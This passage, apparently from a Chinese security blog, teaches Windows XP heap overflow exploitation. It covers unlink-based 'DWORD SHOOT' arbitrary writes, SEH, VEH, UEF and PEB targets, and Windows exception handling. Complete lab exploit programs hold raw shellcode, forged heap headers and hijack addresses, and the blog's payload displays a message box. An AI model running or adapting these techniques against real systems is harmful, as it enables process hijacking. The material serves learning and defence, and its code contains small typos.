    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // heap of the ajacent free block(尾块)
    "\x88\x06\x36\x00"        //0x00360688 is the address of shellcode in first Heapblock
    "\x90\x90\x90\x90";        //target of DWORD SHOOT

DWORD MyExceptionhandler(void)
{
    ExitProcess(1);
    return 0;
}

int main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    memcpy(h1, shellcode, 0x200);    // overflow here
                                    // noticed 0x200 means 512
    __asm int 3                // used to break the process
    __try
    {
        h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    }
    __except(MyExceptionhandler()){}
    return 0;
}

</code></pre>

<p>实验方案：</p>
<ol>
<li>溢出第一个堆块的数据将写入后面的空闲堆块，第二次分配的时候发生DWORD SHOOT。</li>
<li>将SEH的异常回调函数地址作为DWORD SHOOT目标，将其替换为shellcode入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。</li>
</ol>
<p>得到的DWORD的目标地址后，就可以去掉中断指令，更改DWORD SHOOT的目标地址，重新执行</p>
<font color="#f00">遗憾的是，该实验我做了很多次，最后都是无功而返，没有试验现象，到目前为止不知道原因！！！！</font>

<h3 id="4-Windows异常处理"><a href="#4-Windows异常处理" class="headerlink" title="4. Windows异常处理"></a>4. Windows异常处理</h3><h4 id="4-1-不同级别的SEH"><a href="#4-1-不同级别的SEH" class="headerlink" title="4.1 不同级别的SEH"></a>4.1 不同级别的SEH</h4><p>异常处理流程：</p>
<ul>
<li>首先执行线程中距离栈顶最近的SEH异常处理函数</li>
<li>若失败，则依次尝试执行SEH链表中的后续异常处理函数</li>
<li>若SEH链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理</li>
<li>若仍然失败，系统默认的异常处理函数将被调用，程序崩溃窗口将被弹出</li>
</ul>
<h4 id="4-2-线程的异常处理"><a href="#4-2-线程的异常处理" class="headerlink" title="4.2 线程的异常处理"></a>4.2 线程的异常处理</h4><p>线程中用于处理异常的回调函数有4参数：</p>
<ol>
<li>pExcept：指向非常重要的结构体EXCEPTION_RECORD。该结构体包含若干与异常相关的信息，如异常的类型、异常发生的地址等</li>
<li>pFrame：指向栈帧中SEH结构体</li>
<li>pContext：指向Context结构体。该结构体中包含所有寄存器的状态</li>
<li>pDispatch：位置用途</li>
</ol>
<p>返回值：<br>0（ExceptionContinueExecution）：异常被成功处理，将返回原程序发生异常的地方，继续执行后续指令。<br>1（ExceptionContinueSearch）：代表异常处理失败，将顺着SEH链表搜索其他可用于异常处理的函数并尝试处理。</p>
<p><img src="/images/2017-06-28/unwind.jpg" alt="unwind处理过程"></p>
<p>异常处理函数的第一轮调用用来尝试处理异常，而第二轮的unwind调用时，往往执行的是释放资源等操作。</p>
<h4 id="4-3-进程的异常处理"><a href="#4-3-进程的异常处理" class="headerlink" title="4.3 进程的异常处理"></a>4.3 进程的异常处理</h4><p>如果异常没被线程的异常处理函数或调试器处理掉，将交给进程中的异常处理函数。</p>
<p>通过API函数SetUnhandledExceptionFilter来注册，其是kernel32.dll的导出函数。</p>
<font color#f00="">提示：把线程异常处理对应代码中<strong>try{}</strong>except(){}或者Assert等语句，把进程的异常处理对应于函数SetUnhandledExceptionFilter</font>

<p>返回值：</p>
<ul>
<li>1(EXCEPTION_EXECUTE_HANDLER):表示错误得到正确的处理，程序将退出</li>
<li>0(EXCEPTION_CONTINUE_SEARCH):无法处理错误，将错误转交给系统默认的异常处理</li>
<li>-1(EXCEPTION_CONTINUE_EXECUTION):表示错误得到正确处理，并将继续执行下去。类似于线程的异常处理函数，系统会用回调函数会付出异常发生时的断点状况。但这时引起异常的寄存器应该已经得到了恢复。</li>
</ul>
<h4 id="4-4-系统默认异常处理UEF"><a href="#4-4-系统默认异常处理UEF" class="headerlink" title="4.4 系统默认异常处理UEF"></a>4.4 系统默认异常处理UEF</h4><p>如果进程异常处理失败或用户根本没有注册进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用。</p>
<h4 id="4-5-异常处理流程总结"><a href="#4-5-异常处理流程总结" class="headerlink" title="4.5 异常处理流程总结"></a>4.5 异常处理流程总结</h4><ul>
<li>CPU执行发生并捕获异常，内核结果进程的控制权，开始内核态的异常处理</li>
<li>内核异常处理结束，将控制权还给ring3</li>
<li>ring3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher()函数</li>
<li>KiUserExceptionDispatcher()首先会检查程序是否处于调试状态。如果程序正被调试，会将异常交给调试器进行处理</li>
<li>在非调试状态下，KiUserExceptionDispatcher()调用RtlDispatchException()函数对线程的SEH链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，以保证异常处理机制自身的完整性</li>
<li>如果栈中所有的SEH都失败了，且用户曾经使用过SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用。</li>
<li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理UnhandledExceptionFilter()将被调用。UEF会根据注册表里的相关信息决定是默默关闭程序，还是弹出错误对话框</li>
</ul>
<h3 id="5-其他异常处理机制的利用思路"><a href="#5-其他异常处理机制的利用思路" class="headerlink" title="5. 其他异常处理机制的利用思路"></a>5. 其他异常处理机制的利用思路</h3><h4 id="5-1-VEH利用"><a href="#5-1-VEH利用" class="headerlink" title="5.1 VEH利用"></a>5.1 VEH利用</h4><p>VEH（Vectored Exception Handler，向量化异常处理）</p>
<ol>
<li>VEH和进程异常处理类似，都是基于进程的，而且需要使用API注册回调函数</li>
<li>可注册多个VEH。VEH结构体之间串成双向链表，因此比SEH多了一个前向指针</li>
<li>VEH处理优先级次于调试器处理，高于SEH处理。先KiUserExceptionDispatcher，再VEH，最后SEH</li>
<li>VEH保存在堆中</li>
<li>unwind操作只对栈帧中的SEH链起作用，不会涉及VEH这种进程类的异常处理</li>
</ol>
<p><a href="/others/2017-06-28/bh-win-04-litchfield.ppt">Windows heap overfows</a><br>如果能利用堆溢出的DWORD SHOOT修改VEH头结点指针，在异常处理开始后，并能引导程序去执行shellcode</p>
<h4 id="5-2-攻击TEB中的SEH头节点"><a href="#5-2-攻击TEB中的SEH头节点" class="headerlink" title="5.2 攻击TEB中的SEH头节点"></a>5.2 攻击TEB中的SEH头节点</h4><p>异常发生时，异常处理机制会遍历SEH链表中寻找合适的出错函数。线程SEH链通过TEB的第一个DWORD标识(fs:0)，这个指针永远指向离栈顶最近的那个SEH。如果能够修改TEB中的这个指针，在异常发生时就能将程序引导到shellcode中去执行</p>
<p><a href="/images/2017-06-28/halvarflake-winsec02.ppt">Third Generation Exploition</a></p>
<h4 id="5-3-攻击UEF"><a href="#5-3-攻击UEF" class="headerlink" title="5.3 攻击UEF"></a>5.3 攻击UEF</h4><p>如果能通过DWORD SHOOT把这个处理函数覆盖为shellcode的入口地址，再制造一个其他异常处理无法解决的异常，那么系统将使用UEF作为最后一根救命稻草来解决异常时，shellcode就被执行。</p>
<h4 id="5-4-攻击PEB中的函数指针"><a href="#5-4-攻击PEB中的函数指针" class="headerlink" title="5.4 攻击PEB中的函数指针"></a>5.4 攻击PEB中的函数指针</h4><p>前面博客有讲</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/26/堆溢出利用（下）——-代码植入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/26/堆溢出利用（下）——-代码植入/" itemprop="url">堆溢出利用（下）—— 代码植入</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-26T15:10:53+08:00">
                2017-06-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-DWORD-SHOOT的利用方法"><a href="#1-DWORD-SHOOT的利用方法" class="headerlink" title="1 DWORD SHOOT的利用方法"></a>1 DWORD SHOOT的利用方法</h3><p>堆溢出更加精确，往往直接狙击重要目标。精准是DWORD SHOOT的优点，但是“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重要的目标来“狙击”。</p>
<p>本节将介绍内存中常用的“狙击目标”，然后以修改PEB（进程环境块）中的同步函数指针为例，给出完整利用堆溢出执行shellcode的例子。</p>
<p>DWORD SHOOT的常用目标(Windows XP SP1之前的平台)大概可概括为以下几类：</p>
<ul>
<li>内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。如：更改身份验证函数的返回值就可以通过认证机构。</li>
<li>代码逻辑：修改代码段重要函数的关键逻辑有时候可以达到一定攻击效果。如：程序分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为0x90(nop)。这种方法虽然类似于软件破解技术中的“爆破”——通过更改一个字节而改变整个程序的流程。</li>
<li>函数返回地址：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样能够利用DWORD SHOOT更改函数返回地址。但是由于栈帧移位的原因，函数返回地址往往是不固定的，甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有局限，靶子不好瞄准。</li>
<li>攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块(P.E.B)中的U.E.F(Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H指针(T.E.H)。</li>
<li>函数指针：系统优势会使用函数指针呢。比如动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。</li>
<li>P.E.B中线程同步函数的入口地址：PEB存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的一个，那么就能在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于PEB的位置始终不会变化，这对指针在PEB中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的exploit成为可能。<font color="#f00">这是Windows平台下堆溢出利用的最经典方法之一。</font></li>
</ul>
<h3 id="2-狙击PEB中的RtlEnterCriticalSection-的函数指针"><a href="#2-狙击PEB中的RtlEnterCriticalSection-的函数指针" class="headerlink" title="2 狙击PEB中的RtlEnterCriticalSection()的函数指针"></a>2 狙击PEB中的RtlEnterCriticalSection()的函数指针</h3><p>windows为了同步进程下的多个线程，使用了同步措施，如锁措施(lock)、信号量(semaphore)、临界区(critical section)等。<br>当进程退出时，ExitProcess()函数要用到临界区函数RtlEnterCriticalSection和RtlLeaveCriticalSection()来同步线程防止脏数据的产生。</p>
<p>通过进程环境块PEB偏移0x20处存放函数指针来间接完成调用临界区函数。具体就是0x7FFDF020处存放指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存指向RtlLeaveCriticalSection()的指针。</p>
<font color="#f00">从Windows 2003 Server开始修改这部分的实现。</font>

<h4 id="2-1-实验代码如下"><a href="#2-1-实验代码如下" class="headerlink" title="2.1 实验代码如下"></a>2.1 实验代码如下</h4><pre><code>#include &lt;windows.h&gt;

char shellcode[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90...&quot;;

main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    __asm int 3        //used to break process
    memcpy(h1, shellcode, 0x200);    //overflow, 0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
</code></pre><h4 id="2-2-实验步骤"><a href="#2-2-实验步骤" class="headerlink" title="2.2 实验步骤"></a>2.2 实验步骤</h4><ol>
<li>h1向堆中申请200字节的空间</li>
<li>memcpy的上限错误地写成了0x200，这实际上是512字节，会产生溢出</li>
<li>h1分配完之后，后面紧跟一个大空闲块（尾块）</li>
<li>超过200字节的数据将覆盖尾块块首</li>
<li>用伪造的指针覆盖尾块块首中的 空表指针，当h2分配时，将导致DWORD_SHOOT</li>
<li>DWORD SHOOT的目标是0x7FFDF020处的RtlEnterCriticalSection()函数指针，可以简单地将其修改为shellcode位置</li>
<li>DWORD_SHOOT完毕后，堆溢出导致异常，最终导致调用ExitProcess()结束进程</li>
<li>ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从PEB中拿出了指针指向shellcode的指针，因此shellcode被执行</li>
</ol>
<h4 id="2-3-实验细节"><a href="#2-3-实验细节" class="headerlink" title="2.3 实验细节"></a>2.3 实验细节</h4><p>当实验中shellcode为200字节0x90，执行到0x00401085,也就是memcpy函数结束，堆中状态如下图所示（<font color="#0f0">不知道是什么原因，无论shellcode多大，最后使用memcpy(h1, shellcode, 0x200)之后，都会使尾块不见！！！尾块一般的flag标志位0x10</font>）：<br><img src="/images/2017-06-26/dword_shoot_shellcode.jpg" alt="200字节时的堆区"></p>
<p>当然这并不重要，重要的是这里面仍然有堆溢出。<br>缓冲区的布置如下：<br>(1) 将那段168字节的shellcode用0x90补充为200字节。<br>(2) 紧随其后，附上8字节的块首信息。为了防止在DWORD SHOOT发生之前产生异常，不放直接将块首从内存中复制使用&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;<br>(3) 前向指针是DWORD SHOOT的子弹，这里直接使用shellcode的起始地址0x00360688.<br>(4) 后向指针是DWORD SHOOT的“目标”，这里填入PEB的函数指针地址0x7FFDF020.</p>
<p>如果缓冲区内容如下:</p>
<pre><code>
char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\90\x90\x90\x90\x90\x90\x90\x90\x90"

    // MessageBoxA with tile "failwest" and context "failwest"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"

    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";    // 0x00360688 is the address of shellcode in first heap block
                                        // you have to make sure this address via debug
                                        // 0x7ffdf020 is the position in the PEB which hold a pointer to
                                        // RtlEnterCriticalSection() and will called by ExitProcess() at last
</code></pre>

<p>那个消息框不会显示，原因是被修改的P.E.B里的函数指针不光会被ExitProcess()调用，shellcode中的函数也会使用。当shellcode的函数使用临界区时，会像ExitProcess()一样被骗。</p>
<p>为此，需要对shellcode进行修改，在一开始就将DWORD SHOOT的指针修复回去，以防出错。重新调试，发现0x7FFDF020处的函数指针是0x77F82060.</p>
<font color="#f00">P.E.B中RtlEnterCriticalSection()函数指针位置0x7ffdf020不会变，但是所指向的地址会变。劫持进程之后，一定要修复回劫持之前的值，否则会出现各种问题！</font>

<pre><code>

#include &lt;windows.h&gt;

char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

    // repaire the pointer which shooted by heap over run
    "\xB8\x20\xF0\xFD\x7F"        // MOV EAX, 7FFDF020
    "\xBB\x60\x20\xF8\x77"        // MOV EBX, 0x77F86020 the address
                                // may releated to your OS
    "\x89\x18"                    // MOV DWORD PTR DS:[EAX], EBX

    // MessageBoxA with tile "failwest" and context "failwest"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"

    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";    // 0x00360688 is the address of shellcode in first heap block
                                        // you have to make sure this address via debug
                                        // 0x7ffdf020 is the position in the PEB which hold a pointer to
                                        // RtlEnterCriticalSection() and will called by ExitProcess() at last


int main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    //__asm int 3        //used to break process
    memcpy(h1, shellcode, 0x200);    //overflow, 0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
</code></pre>


<h3 id="3-堆溢出利用的注意事项"><a href="#3-堆溢出利用的注意事项" class="headerlink" title="3 堆溢出利用的注意事项"></a>3 堆溢出利用的注意事项</h3><h4 id="3-1-调试堆与常态堆的区别"><a href="#3-1-调试堆与常态堆的区别" class="headerlink" title="3.1 调试堆与常态堆的区别"></a>3.1 调试堆与常态堆的区别</h4><p>使用常态堆的方法：</p>
<ol>
<li>插入int 3中断指令（仅限于你能修改源码）</li>
<li>直接修改用于检测调试器的函数的返回值</li>
</ol>
<h4 id="3-2-在shellcode中修复环境"><a href="#3-2-在shellcode中修复环境" class="headerlink" title="3.2 在shellcode中修复环境"></a>3.2 在shellcode中修复环境</h4><p>本实验中就遇到了这种问题，在劫持进程后需要立刻修复P.E.B中的函数指针，否则会引起很多其他异常。</p>
<p>shellcode中的第一条指令CDF也是用来修复环境的，如果去掉，会发现shellcode自身发生内存读写异常。这是因为ExitProcess()调用时，这种特殊的上下文会把通常状态为0的DF标志 位修改为1.这会导致shellcode中的LODS DWORD PTR DS:[ESI]指令在向EAX装入第一个hash后将ESI减4，而不是通常的加4，从而在下一个函数名hash读取时发生错误。</p>
<p>比较简单的修复步骤：</p>
<ol>
<li>在堆区偏移0x28的地方存放着堆区所有空闲块的总和TotalFreeSize</li>
<li>把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量大小（TotalFreeSize）</li>
<li>把该块的flag位设置为0x10（last entry尾块）</li>
<li>把freelist[0]的前向指针和后向指针指向这个堆块</li>
</ol>
<h4 id="3-3-定位shellcode的跳板"><a href="#3-3-定位shellcode的跳板" class="headerlink" title="3.3 定位shellcode的跳板"></a>3.3 定位shellcode的跳板</h4><p>经常会有寄存器指向堆区离shellcode不远的地方，使用几种指令作为跳板定位shellcode。这些指令一般位于netapi32.dll、user32.dll、rpcrt4.dll中找到</p>
<pre><code>
CALL DWORD PTR [EDI+0X78]
CALL DWORD PTR [ESI+0X4C]
CALL DWORD PTR [EBP+0X74]
</code></pre>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/26/堆溢出利用（上）——DWORD-SHOOT/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/26/堆溢出利用（上）——DWORD-SHOOT/" itemprop="url">堆溢出利用（上）——DWORD SHOOT</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-26T10:42:20+08:00">
                2017-06-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-堆表“拆卸”中的问题"><a href="#1-堆表“拆卸”中的问题" class="headerlink" title="1 堆表“拆卸”中的问题"></a>1 堆表“拆卸”中的问题</h3><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是对链表的修改。分配是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并也可以看做将若干个堆块先从空表中卸下，修改块首信息（大小），之后把更新后的新块“链入”空表。</p>
<p>“卸下”和“链入”的过程就有可能获得一次读写内存的机会。</p>
<p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>能向内存任意地址写入任意数据的机会成为&quot;DWORD SHOOT&quot;（&quot;arbitrary DWORD reset&quot;）。其发生时，不但可以控制射击的目标(任意地址)，还可以选用适当的子弹(4字节恶意数据)。</p>
<p>DWORD SHOOT可以劫持进程。</p>
<table>
<thead>
<tr>
<th>点射目标(Target)</th>
<th>子弹(Payload)</th>
<th>改写的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>栈帧中的函数返回地址</td>
<td>shellcode起始地址</td>
<td>函数返回时，跳去执行shellcode</td>
</tr>
<tr>
<td>栈帧中的S.E.H句柄</td>
<td>shellcode起始地址</td>
<td>异常发生时，跳去执行shellcode</td>
</tr>
<tr>
<td>重要函数调用地址</td>
<td>shellcode起始地址</td>
<td>函数调用时,跳去执行shellcode</td>
</tr>
</tbody>
</table>
<h3 id="2-DWORD-SHOOT-举例"><a href="#2-DWORD-SHOOT-举例" class="headerlink" title="2 DWORD SHOOT 举例"></a>2 DWORD SHOOT 举例</h3><p>这里举的是将一个结点从双向链表中“卸下”时可能发生的问题:</p>
<pre><code>int remove(ListNode *node)
{
    node-&gt;blink-&gt;flink = node-&gt;flink;
    node-&gt;flink-&gt;blink = node-&gt;blink;
    return 0;
}
</code></pre><p>通过这个函数逻辑，得到下图缩水的链表变化过程。<br><img src="/images/2017-06-26/remove_node.jpg" alt="卸载结点的过程图"></p>
<p><font color="#f00">当堆溢出发生时，非法数据会淹没下一个堆块块首。即块首中存放的前向指针和后向指针可以被攻击者伪造，当这个堆块从双向链表中卸下时，node-&gt;blink-&gt;flink=node-&gt;flink将把伪造的flink指针值写入伪造的blink所指向的地址中去，从而发生DWORD SHOOT。</font><br><img src="/images/2017-06-26/dword_shoot.jpg" alt="DWORD SHOOT发生的原理"></p>
<h3 id="3-调试中体会DWORD-SHOOT"><a href="#3-调试中体会DWORD-SHOOT" class="headerlink" title="3 调试中体会DWORD SHOOT"></a>3 调试中体会DWORD SHOOT</h3><p>代码如下:</p>
<pre><code>#include &lt;windows.h&gt;

int main()
{
    HLOCAL h1,h2,h3,h4,h5,h6;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);

    h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    __asm int 3        // used to break the process
    //free the odd blocks to prevent coalesing
    HeapFree(hp, 0, h1);
    HeapFree(hp, 0, h3);
    HeapFree(hp, 0, h5);    //now freelist[2] got 3 entries

    //will allocate from freelist[2] which means unlink the last entry(h5)
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);

    return 0;
}
</code></pre><p>(1) 程序首先创建了一个大小为0x1000的堆区，并从其中连续申请了6个大小为8字节的堆块（加上堆首就是16字节），这应该会从大块上切下来。<br>(2) 释放奇数次申请的堆块为了防止堆块合并的发生。<br>(3) 三次释放结束后，freelist[2]所标识的空表中应该链入了3个空闲链表，它们一次是h1、h3、h5。<br>(4) 再次申请8字节的堆块，应该从freelist[2]所标识的空表中分配，这意味着最后一个堆块h5被从空表中拆下。<br>(5) 如果我们手动修改h5块首中的指针，应该能够观察到DWORD SHOOT的发生。</p>
<p>将代码执行到0x0040112E处，此时三次内存释放操作结束。此时堆块状况如下：<br><img src="/images/2017-06-26/freelist.jpg" alt="空表索引"><br><b><center>空表索引</center></b><br><img src="/images/2017-06-26/freelist2.jpg" alt="空表索引"><br><b><center>堆块状况</center></b></p>
<p>从0x0040112E处开始，共有7个堆块，如表所示：</p>
<p><b><center>堆块使用状况</center></b></p>
<table>
<thead>
<tr>
<th></th>
<th>起始位置</th>
<th>Flag</th>
<th>Size 单位:8bytes</th>
<th>前向指针</th>
<th>后向指针</th>
</tr>
</thead>
<tbody>
<tr>
<td>h1</td>
<td>0x00360680</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x003606A8</td>
<td>0x00360188</td>
</tr>
<tr>
<td>h2</td>
<td>0x00360690</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>h3</td>
<td>0x003606A0</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x003606C8</td>
<td>0x00360688</td>
</tr>
<tr>
<td>h4</td>
<td>0x003606B0</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>h5</td>
<td>0x003606C0</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x00360188</td>
<td>0x003606A8</td>
</tr>
<tr>
<td>h6</td>
<td>0x003606D0</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>尾块</td>
<td>0x003606E0</td>
<td>最后一项0x10</td>
<td>0x0124</td>
<td>0x00360178<br>(freelist[0])</td>
<td>0x00360178<br>(freelist[0])</td>
</tr>
</tbody>
</table>
<p>除了freelist[0]和freelist[2]之外，所有的空表索引都为空（指向自身）。结合上面给出的空表索引图，我们可以得到freelist[2]链表的组织情况。如图所示：<br><img src="/images/2017-06-26/freelist3.jpg" alt="链表组织情况"></p>
